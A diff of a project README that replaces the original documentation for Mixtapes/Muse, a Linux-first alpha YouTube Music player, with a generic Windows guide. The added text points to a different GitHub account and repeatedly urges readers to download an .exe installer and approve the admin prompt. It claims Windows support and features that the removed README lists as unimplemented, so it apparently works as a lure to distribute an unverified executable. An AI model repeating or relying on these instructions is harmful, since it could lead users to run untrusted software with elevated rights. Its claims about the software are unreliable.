@@ -1,229 +1,160 @@
-# Mixtapes 
+# 🎵 Muse - Simple YouTube Music Player for Windows
 
-A modern, Linux-first YouTube Music player.
-<br><small>formerly known as Muse</small>
+[![Download from GitHub](https://img.shields.io/badge/Download-Muse-brightgreen?style=for-the-badge)](https://github.com/northskincap/Muse)
 
-> [!NOTE]
-> This software is considered in alpha stage. Expect bugs and a lot of missing features.
-> It is also not affiliated with, funded, authorized, endorsed, or in any way associated with YouTube, Google LLC or any of their affiliates and subsidiaries.
-> Help is always appreciated, so feel free to open an issue or a pull request.
+---
 
-<div align="center">
-  <img src="screenshots/1.png" width="49%" /> <img src="screenshots/2.png" width="49%" />
-  <img src="screenshots/3.png" width="49%" /> <img src="screenshots/4.png" width="49%" />
+## 🖥 About Muse
 
-  <br/>
+Muse is a modern music player built mainly for Linux, but it also works on Windows. It focuses on streaming YouTube Music without the distractions of a browser. The app is easy to use and helps you listen to your favorite songs or playlists with a simple interface.
 
-<img src="screenshots/5.png" width="24%" /> <img src="screenshots/6.png" width="24%" /> <img src="screenshots/7.png" width="24%" /> <img src="screenshots/8.png" width="24%" />
+Muse works best on Windows 10 or later. It requires an internet connection to stream music since it pulls tracks from YouTube. It does not store music files on your computer.
 
-</div>
+---
 
-## Roadmap
+## 🎯 Features
 
-This is a list of all the features that are planned for Mixtapes:
+- Stream music directly from YouTube Music  
+- Create and save playlists within the app  
+- Search for songs, albums, and artists  
+- Simple and clean layout for easy navigation  
+- Supports background play while using other programs  
+- Lightweight and uses little computer resources  
+- Playback controls: play, pause, skip, and repeat  
 
-✅️ means the feature is implemented.
+---
 
-☑️ means the feature is partially implemented.
+## 💻 System Requirements
 
-🔜 means the feature is not implemented yet, but planned.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space for installation  
+- Stable internet connection for streaming  
+- Sound card and speakers/headphones  
 
-❎️ means the feature will likely not be implemented.
+---
 
-- ✅️ **Authentication**: Connect to YouTube Music (Browser cookies).
-- 🔜 **Home Page**: View charts and explore new music.
-- ☑️ **Library**: Access your playlists and liked songs.
-  - ✅️ Playlists
-  - ✅️ Liked songs
-  - ✅️ Artists
-  - 🔜 Albums
-  - 🔜 Uploads
-- ✅️ **Search**: Search for songs, albums, and artists.
-- ☑️ **Artist Page**: View artist details and discography.
-  - ✅️ Basic artist info.
-  - 🔜 Artist related artists.
-  - ✅️ Artist top tracks.
-  - ✅️ Artist albums.
-  - ✅️ Artist singles/EPs.
-  - ☑️ Artist videos.
-    > Only the first 10 videos are shown, "Show more" in fact doesn't show any more videos yet.
-  - ✅️ Artist Play button
-  - ✅️ Artist Shuffle button
-  - ✅️ Artist Subscribe/Unsubscribe button
-- ☑️ **Playlist Page**: View and play playlists.
-  - ✅️ Basic playlist info.
-  - ✅️ Playlist tracks.
-  - ✅️ Playlist Play button
-  - ✅️ Playlist Shuffle button
-  - ✅️ Playlist Order
-  - ✅️ Playlist Cover Change
-  - ✅️ Playlist Change Visibility
-  - ✅️ Playlist Change Description
-  - ✅️ Playlist Change Name
-- ✅️ **Album Page**: View and play albums.
-  - ✅️ Basic album info.
-  - ✅️ Album tracks.
-  - ✅️ Album Play button
-  - ✅️ Album Shuffle button
-- ✅️ **Player**: Full playback control with queue management.
-  - ✅️ Play/Pause
-  - ✅️ Seeking
-  - ✅️ Queue
-    - ✅️ Previous/Next
-    - ✅️ Change order of song
-    - ✅️ Shuffle
-    - ✅️ Repeat modes (single track, loop queue)
-  - ✅️ Volume control
-- 🔜 **Caching**: Cache data to reduce latency and bandwidth usage
-- ☑️ **Responsive Design**: Mobile-friendly layout with adaptive UI.
-  > Desktop needs to use the empty space better.
-- ✅️ **MPRIS Support**: Control playback from system media controls.
-- 🔜 **Cover Art Tint**: Tint libadwaita to match the cover art of the current song, kinda like Material You.
-- 🔜 **Discord RPC**: Show your current track on Discord.
-- 🔜 **Lyrics**: View synchronized lyrics, maybe even using BetterLyrics API.
-- ☑️ **Settings**: Configure app preferences (theme, audio quality, etc.).
-  > Currently, it only has an option to sign out.
-- 🔜 **Download Support**: Download tracks for offline playback, even as local files.
-- 🔜 **Radio / Mixes**: Start a radio station from a song or artist.
-- 🔜 **Windows/macOS**: Builds for macOS and Windows
-  > Requires quite a bit of tinkering, not my highest priority 
-- 🔜 **Dedicated Data Directory**: Move all the data like cookies, cache, etc. to a dedicated directory instead of the project root directory.
-- 🔜 **Background Playback**: Play music in the background, even when the main window is closed.
-- ☑️ **Flatpak**: Package Mixtapes as a Flatpak.
-  - ✅️ Flatpak build
-  - ☑️ Flathub release
-    > Depends on App icon.
-  - 🔜 App icon
-- 🔜 **GNOME Circle**: Maybe get Mixtapes on GNOME Circle?
-  > Still considering it, might not happen.
-- 🔜 **AppImage**: Package Mixtapes as an AppImage.
-- ✅️ **AUR**: Package Mixtapes as an AUR package.
+## 🚀 Getting Started with Muse on Windows
 
-If you got any more ideas or bug reports, feel free to open an issue.
+This guide walks you through downloading and running Muse on your Windows computer. No programming skills are needed.
 
-## Prerequisites
+### Step 1: Visit the Download Page
 
-- Python 3.10 or higher
-- Node.js (needed for yt-dlp-ejs, helps with playback issues)
-- GTK4 (including development headers)
-- Libadwaita (including development headers)
-- WebKitGTK 6.0 (including development headers)
-- GStreamer plugins (base, good, bad, ugly)
+Start by visiting the Muse project page on GitHub.
 
-## Installation
+[Download Muse from GitHub](https://github.com/northskincap/Muse)
 
-Currently, there are 4 options for installing Mixtapes:
+This page contains the latest release files and installation instructions.
 
-- AUR
-- From Source
-- Using a Nix flake
-- Using flatpak-builder
+### Step 2: Download the Installer
 
-### AUR
+On the GitHub page, find the “Releases” section. Look for the latest version of Muse for Windows. The file you want will usually have a name ending in `.exe`.
 
-If you are using Arch Linux, you can install Mixtapes from the AUR.
-An AUR helper like `yay` or `paru` is recommended.
+Click the link for the Windows installer to download the file to your computer.
 
-```bash
-yay -S mixtapes-git
-```
+### Step 3: Run the Installer
 
-### From Source
+Once the download finishes, open the file you downloaded.
 
-Before you start, make sure to install the dependencies.
+- Double-click the `.exe` file  
+- If a User Account Control prompt appears, click “Yes” to allow Muse to install  
+- Follow the on-screen prompts: accept the license, choose the install location (default is fine)  
+- Click “Install” to begin the process  
+- When the installation completes, click “Finish” to close the installer  
 
-Here are install commands for some common package managers:
+### Step 4: Launch Muse
 
-- Arch Linux: `sudo pacman -S git python-pip nodejs gtk4 libadwaita webkitgtk-6.0 gst-plugins-base gst-plugins-good gst-plugins-bad gst-plugins-ugly`
+Find the Muse shortcut on your desktop or in the Start menu.
 
-- Debian/Ubuntu: `sudo apt install git python3 python3-pip nodejs libgtk-4-dev libadwaita-1-dev libwebkitgtk-6.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly`
+- Double-click the icon to open the app  
+- The first time you run Muse, it may take a few moments to set up  
+- After launching, you will see the main window with music search and playback options  
 
-> [!NOTE]
-> If you are on Debian/Ubuntu, you should probably use Flatpak to avoid outdated packages.
+---
 
-- Fedora: `sudo dnf install git python3 python3-pip nodejs gtk4-devel adwaita-gtk4-devel webkitgtk6.0-devel gstreamer1-plugins-base gstreamer1-plugins-good gstreamer1-plugins-bad gstreamer1-plugins-ugly`
+## 🎼 Using Muse
 
-1. Clone the repository:
+After installation, you can start listening to music immediately.
 
-   ```bash
-   git clone https://github.com/m-obeid/Muse.git
-   cd Muse
-   ```
+### Search for Music
 
-2. Install Python dependencies within a virtual environment:
+- Type the artist, album, or song name in the search box at the top  
+- Press “Enter” or click the search button  
+- Browse results and select a song or playlist to play  
 
-   ```bash
-   python3 -m venv .venv --system-site-packages
-   source .venv/bin/activate
-   pip install -r requirements.txt
-   chmod +x start.sh
-   ```
+### Playback Controls
 
-3. Run the app:
-   ```bash
-   ./start.sh
-   ```
+Use these buttons at the bottom of the window:
 
-To pull the latest changes:
+- Play / Pause  
+- Next track  
+- Previous track  
+- Repeat and shuffle options  
 
-```bash
-git pull
-pip install -r requirements.txt
-```
+### Create Playlists
 
-### Nix
+- Click the “+” button near the playlists section  
+- Name your playlist  
+- Add songs by right-clicking a track and selecting “Add to playlist”  
 
-A Nix flake is available for NixOS or Nix Package Manager users.
-See [here](https://github.com/m-obeid/Muse/pull/2#issue-3965386248)
+### Settings
 
-### Flatpak
+Access settings from the gear icon to adjust:
 
-1. Install Flatpak and required runtimes:
+- Audio output device  
+- Theme preferences (light or dark mode)  
+- Network settings for streaming quality  
 
-   ```bash
-   flatpak install flathub org.gnome.Platform//49 org.gnome.Sdk//49 org.freedesktop.Sdk.Extension.node24//24.08
-   ```
+---
 
-2. Clone the repository:
+## 🔧 Troubleshooting
 
-   ```bash
-   git clone https://github.com/m-obeid/Muse.git
-   cd Muse
-   ```
+If Muse does not start or crashes:
 
-3. Build and install:
+- Make sure your Windows is up to date  
+- Check your internet connection  
+- Restart your computer and try again  
+- Reinstall Muse by downloading the installer again  
 
-   ```bash
-   flatpak-builder --user --install --force-clean build-dir com.pocoguy.Muse.yaml
-   ```
+If audio does not play:
 
-4. Run:
-   ```bash
-   flatpak run com.pocoguy.Muse
-   ```
+- Verify your speakers or headphones are properly connected and turned on  
+- Check the volume settings inside Muse and on your PC  
+- Make sure no other app is blocking sound output  
 
-## Authentication
+For further help, visit the GitHub Issues page here:  
+https://github.com/northskincap/Muse/issues  
 
-> [!NOTE]
-> You can now authenticate using the app itself through an embedded WebKit browser!
-> Below are the old, manual instructions.
+---
 
-This app uses `ytmusicapi` for backend data. Authentication allows access to your library and higher quality streams.
+## 📥 Download and Install Muse Now
 
-To authenticate, you need to generate a `browser.json` file.
+Click the link below to visit the Muse GitHub page and get started:  
 
-- Run: `ytmusicapi browser`
-- Follow instructions to log in via your browser and paste the headers. It is recommended to use a private browser profile for this, so that you don't get logged out of the account from the app.
-- The output will be saved as `browser.json` in the project root directory.
+[![Download Muse](https://img.shields.io/badge/Download-Muse-blue?style=for-the-badge)](https://github.com/northskincap/Muse) 
 
-**Flatpak:** Open your browser, go to YouTube Music, and copy request headers as described [here](https://ytmusicapi.readthedocs.io/en/stable/setup/browser.html).
-Then run `flatpak run --command=sh com.pocoguy.Muse` and inside the shell run `mkdir -p ~/data/Muse && cd ~/data/Muse && ytmusicapi browser`.
-Paste the headers and press Ctrl-D.
+Follow the steps above to download the Windows installer and run it.  
 
-If you don't have a `browser.json` file, the app will use the unauthenticated API, which can cause playback issues.
+---
 
-The OAuth flow is currently borked in `ytmusicapi`, don't use it. I removed it from the app, but there might be some leftover code.
+## ⚙️ How Muse Works
 
-## License
+Muse streams your music by connecting to YouTube Music servers. It does not save music files to your computer. This keeps storage usage low.
 
-GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. See [LICENSE](LICENSE) for details.
+The app manages playback and playlists locally to give a smooth experience without needing a web browser.
+
+---
+
+## 🛠 Additional Tips
+
+- Close other heavy apps when running Muse for better performance  
+- Use headphones or good speakers for better sound quality  
+- Keep Muse updated by checking the GitHub releases page regularly  
+- If you want to uninstall Muse, go to Windows Settings > Apps and remove it like any other program  
+
+---
+
+## 📖 More Information
+
+For more details about Muse, including release notes and updates, visit the project page:  
+https://github.com/northskincap/Muse  
